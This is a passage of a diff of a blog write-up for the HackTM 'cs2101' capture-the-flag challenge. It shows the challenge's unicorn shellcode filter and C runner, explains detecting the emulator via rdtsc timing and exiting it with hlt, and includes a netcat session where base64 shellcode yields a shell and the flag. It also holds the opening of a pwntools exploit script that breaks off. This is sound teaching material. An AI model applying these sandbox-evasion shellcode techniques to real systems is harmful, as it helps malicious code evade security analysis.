class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># memory address where emulation starts</span></span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sc.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> emulate(code):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Done emulating. Passed!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Done emulating. Failed!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">emulate</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in X86-64bit mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># map memory</span></span><br><span class="line">        mu.mem_map(ADDRESS, <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># shellcode to test</span></span><br><span class="line">        mu.mem_write(ADDRESS, code)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># initialize machine registers</span></span><br><span class="line">        mu.reg_write(UC_X86_REG_RAX, ADDRESS)</span><br><span class="line">        mu.reg_write(UC_X86_REG_RFLAGS, <span class="number">0x246</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># initialize hooks</span></span><br><span class="line">        allowed = [<span class="literal">True</span>]</span><br><span class="line">        mu.hook_add(UC_HOOK_INSN, syscall_hook, allowed, <span class="number">1</span>, <span class="number">0</span>, UC_X86_INS_SYSCALL)</span><br><span class="line">        mu.hook_add(UC_HOOK_CODE, code_hook, allowed)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># emulate code in infinite time &amp; unlimited instructions</span></span><br><span class="line">        mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(code))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> allowed[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">syscall_hook</span>(<span class="params">mu, user_data</span>):</span><br><span class="line">    <span class="comment"># Syscalls are dangerous!</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not allowed to use syscalls&quot;</span>)</span><br><span class="line">    user_data[<span class="number">0</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_hook</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    inst = mu.mem_read(address, size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CPUID (No easy wins here!)</span></span><br><span class="line">    <span class="keyword">if</span> inst == <span class="string">b&#x27;\x0f\xa2&#x27;</span>:</span><br><span class="line">        user_data[<span class="number">0</span>] = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;CPUID&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>To succeed the check in the server our shellcode should match several conditions: first there should not be any syscalls &#x2F; <code>cpuid</code> instructions, then it should exit (and return allowed[0] &#x3D;&#x3D;&#x3D; true) without triggering an exception not handled by unicorn (for example <code>SIGSEGV</code> or an interrupt not handled like <code>int 0x80</code>. And if it does so the shellcode is ran by this program:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDRESS ((void*)0x1000000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* gcc emulate.c -o emulate -masm=intel */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;filename&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *code = mmap(ADDRESS, <span class="number">0x1000</span>,</span><br><span class="line">                      PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                      MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *filename = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> fd = open(filename, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(fd, code, <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rcx, [rsp-0x1800]\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;fxrstor [rcx]\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rbx, rbx\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rcx, rcx\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rdx, rdx\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rdi, rdi\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rsi, rsi\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rbp, rbp\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rsp, rsp\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r8, r8\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r9, r9\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r10, r10\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r11, r11\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r12, r12\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r13, r13\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r14, r14\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r15, r15\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;jmp rax\n\t&quot;</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;a&quot;</span> (code)</span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If we succeed to run the shellcode within this program we could easily execute syscalls and then drop a shell.</p>
+<h2 id="Bypass-the-sandbox"><a href="#Bypass-the-sandbox" class="headerlink" title="Bypass the sandbox"></a>Bypass the sandbox</h2><p>The first step is to make our shellcode aware of the environment inside which it is running. A classic trick to achieve this is to use the <code>rdtsc</code> instruction (<a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/rdtsc">technical spec here</a>). According to the documentation, it:</p>
 <blockquote>
 <p>Reads the current value of the processor’s time-stamp counter (a 64-bit MSR) into the EDX:EAX registers. The EDX register is loaded with the high-order 32 bits of the MSR and the EAX register is loaded with the low-order 32 bits. (On processors that support the Intel 64 architecture, the high-order 32 bits of each of RAX and RDX are cleared.)</p>
 </blockquote>
-<p>Given within a debugger / emulator (depends on what is hooked actually, in an emulator it could be easily handled) the time between the execution of two instructions is very long we could check that the shellcode is ran casually by the C program without being hooked at each instruction (as it is the case in the unicorn sandbox) just by checking that the amount of time between two instructions is way shorter than in the sandbox. This way we can trigger a different code path in the shellcode according to the environment inside which it is run.</p>
+<p>Given within a debugger &#x2F; emulator (depends on what is hooked actually, in an emulator it could be easily handled) the time between the execution of two instructions is very long we could check that the shellcode is ran casually by the C program without being hooked at each instruction (as it is the case in the unicorn sandbox) just by checking that the amount of time between two instructions is way shorter than in the sandbox. This way we can trigger a different code path in the shellcode according to the environment inside which it is run.</p>
 <p>The second step is about being able to leave the sandbox without any syscalls with a handled exception that will not throw an error. By reading the unicorn source code for a while I saw a comment that talked about the <code>hlt</code> instruction, then I tried to use it to shutdown the shellcode when it is run by the sandbox and it worked pretty good.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="profit">
-        PROFIT
-        <a data-clipboard-text="https://nasm.re/posts/cs2101/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>Putting it all together we manage to get the flag:</p>
-<pre tabindex="0"><code>[root@(none) chal]# nc 34.141.16.87 10000
-Enter your base64 encoded shellcode:
-DzFJicBIweIgSQnQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQDzFJicFIweIgSQnRTSnBSYH5AAEAAH8JSMfAagAAAf/g9EjHxAAAAAFIgcQABQAAamhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F
-id
-uid=1000(user) gid=1000(user) groups=1000(user)
-ls
-emulate
-flag.txt
-requirements.txt
-run
-sc_filter.py
-server.py
-cat flag.txt
-HackTM{Why_can't_you_do_your_homework_normally...}
-</code></pre><div class="gblog-post__anchorwrap">
-    <h2 id="final-exploit">
-        Final exploit
-        <a data-clipboard-text="https://nasm.re/posts/cs2101/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>Final epxloit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
+<h2 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h2><p>Putting it all together we manage to get the flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@(none) chal]# nc 34.141.16.87 10000</span><br><span class="line">Enter your base64 encoded shellcode:</span><br><span class="line">DzFJicBIweIgSQnQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQDzFJicFIweIgSQnRTSnBSYH5AAEAAH8JSMfAagAAAf/g9EjHxAAAAAFIgcQABQAAamhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F</span><br><span class="line">id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user)</span><br><span class="line">ls</span><br><span class="line">emulate</span><br><span class="line">flag.txt</span><br><span class="line">requirements.txt</span><br><span class="line">run</span><br><span class="line">sc_filter.py</span><br><span class="line">server.py</span><br><span class="line">cat flag.txt</span><br><span class="line">HackTM&#123;Why_can&#x27;t_you_do_your_homework_normally...&#125;</span><br></pre></td></tr></table></figure>
 
-<span class="c1"># this exploit was generated via</span>
-<span class="c1"># 1) pwntools</span>
-<span class="c1"># 2) ctfmate</span>
+<h2 id="Final-exploit"><a href="#Final-exploit" class="headerlink" title="Final exploit"></a>Final exploit</h2><p>Final epxloit:</p>
+<pre><code class="py">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">pwn</span>
+# this exploit was generated via
+# 1) pwntools
+# 2) ctfmate
 
-<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;emulate&#34;</span>
-<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/usr/lib/libc.so.6&#34;</span>
-<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>
+import os
+import time
+import pwn
 
-<span class="c1"># Set up pwntools for the correct architecture</span>
-<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
-<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
-<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
-<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
-<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
-<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
-<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
-<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
-<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
-<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+BINARY = &quot;emulate&quot;
+LIBC = &quot;/usr/lib/libc.so.6&quot;
+LD = &quot;/lib64/ld-linux-x86-64.so.2&quot;
 
-<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
-<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+# Set up pwntools for the correct architecture
+exe = pwn.context.binary = pwn.ELF(BINARY)
+libc = pwn.ELF(LIBC)
+ld = pwn.ELF(LD)
+pwn.context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]
+pwn.context.delete_corefiles = True
+pwn.context.rename_corefiles = False
+p64 = pwn.p64
+u64 = pwn.u64
+p32 = pwn.p32
+u32 = pwn.u32
+p16 = pwn.p16
+u16 = pwn.u16
+p8  = pwn.p8
+u8  = pwn.u8
 
-<span class="n">FILENAME</span> <span class="o">=</span> <span class="s2">&#34;shellcode&#34;</span>
+host = pwn.args.HOST or &#39;127.0.0.1&#39;
+port = int(pwn.args.PORT or 1337)
 
-<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;shellcode&#34;</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+FILENAME = &quot;shellcode&quot;
+
+def local(argv=[&quot;shellcode&quot;], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if pwn.args.GDB:
+        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return pwn.process([exe.path] + argv, *a, **kw)
 
 
-<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">io</span>
+def remote(argv=[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io = pwn.connect(host, port)
+    if pwn.args.GDB:
+        pwn.gdb.attach(io, gdbscript=gdbscript)
+    return io
 
 
-<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+def start(argv=[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if pwn.args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
 
 
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
-</span><span class="s1">continue
-</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+gdbscript = &#39;&#39;&#39;
+continue
+&#39;&#39;&#39;.format(**locals())
 
-<span class="kn">import</span> <span class="nn">base64</span>
+import base64
 
-<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
-    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shellcode&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
+def exp():
+    f = open(&quot;shellcode&quot;, &quot;wb&quot;)
 
-    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span> 
-        <span class="s2">&#34;rdtsc</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;mov r8, rax</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;shl rdx, 32</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;or r8, rdx</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;rdtsc</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;mov r9, rax</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;shl rdx, 32</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;or r9, rdx</span><span class="se">\n</span><span class="s2">&#34;</span>
+    shellcode = pwn.asm( 
